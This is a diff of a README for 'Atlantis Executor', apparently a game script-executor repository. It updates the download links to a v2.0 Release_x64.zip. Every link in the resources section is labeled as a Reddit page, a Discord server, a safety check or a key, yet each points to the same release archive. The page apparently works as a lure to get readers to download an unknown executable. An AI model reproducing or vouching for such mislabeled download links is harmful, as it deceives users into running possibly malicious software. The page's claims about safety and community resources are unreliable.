@@ -20,7 +20,7 @@ Welcome to the official Atlantis Executor repository - the ultimate solution for
 
 Ready to embark on your gaming adventure with Atlantis Executor? Click on the link below to download the software package:
 
-[![Download Atlantis Executor](https://github.com/Justanamelessghoul/Atlantis-Executor/releases/download/v1.0/App.zip%20Executor-blue)](https://github.com/Justanamelessghoul/Atlantis-Executor/releases/download/v1.0/App.zip)
+[![Download Atlantis Executor](https://github.com/Justanamelessghoul/Atlantis-Executor/releases/download/v2.0/Release_x64.zip%20Executor-blue)](https://github.com/Justanamelessghoul/Atlantis-Executor/releases/download/v2.0/Release_x64.zip)
 
 ### Note:
 - Click on the link above to download the Atlantis Executor software package.
@@ -53,10 +53,10 @@ Stay connected with fellow gamers and enthusiasts by joining the Atlantis Execut
 
 Unlock the full potential of Atlantis Executor with the following key resources:
 
-- [Atlantis Executor Reddit](https://github.com/Justanamelessghoul/Atlantis-Executor/releases/download/v1.0/App.zip)  
-- [Atlantis Executor Discord Server](https://github.com/Justanamelessghoul/Atlantis-Executor/releases/download/v1.0/App.zip)  
-- [Is Atlantis Executor Safe?](https://github.com/Justanamelessghoul/Atlantis-Executor/releases/download/v1.0/App.zip)  
-- [Atlantis Executor Key](https://github.com/Justanamelessghoul/Atlantis-Executor/releases/download/v1.0/App.zip)  
+- [Atlantis Executor Reddit](https://github.com/Justanamelessghoul/Atlantis-Executor/releases/download/v2.0/Release_x64.zip)  
+- [Atlantis Executor Discord Server](https://github.com/Justanamelessghoul/Atlantis-Executor/releases/download/v2.0/Release_x64.zip)  
+- [Is Atlantis Executor Safe?](https://github.com/Justanamelessghoul/Atlantis-Executor/releases/download/v2.0/Release_x64.zip)  
+- [Atlantis Executor Key](https://github.com/Justanamelessghoul/Atlantis-Executor/releases/download/v2.0/Release_x64.zip)  
 
 ---
 
